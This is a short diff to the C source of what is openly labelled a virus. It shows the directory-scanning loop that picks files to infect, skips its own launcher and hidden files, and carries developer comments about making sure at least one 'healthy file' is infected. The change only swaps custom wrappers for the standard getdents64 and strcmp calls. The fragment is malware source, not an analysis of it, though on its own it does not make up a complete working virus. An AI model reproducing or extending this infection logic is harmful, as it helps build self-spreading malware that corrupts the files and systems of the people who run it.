@@ -356,7 +356,7 @@ rescan:
 	// PER: break at $14 = (void (*)()) 0x401dfb <do_main+264>
 	for (;;)
 	{
-		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768); // 32768 is the size of dbuf
+		nread = getdents64(dd, (struct linux_dirent64 *)dbuf, 32768); // 32768 is the size of dbuf
 		// PER: nread is the number of bytes read from the directory, `all files' details directly in a single `dbuf` buffer`
 
 		// PER: error
@@ -372,7 +372,7 @@ rescan:
 			// PER: It is ensured that atleast one healthy file(that passes the criteria) is infected
 			d = (struct linux_dirent64 *)(dbuf + bpos);
 			bpos += d->d_reclen - 1;
-			if (!_strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) // PER: linux_dirent64 of virus is 80
+			if (!strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) // PER: linux_dirent64 of virus is 80
 				continue;
 			if (d->d_name[0] == '.')
 				continue;
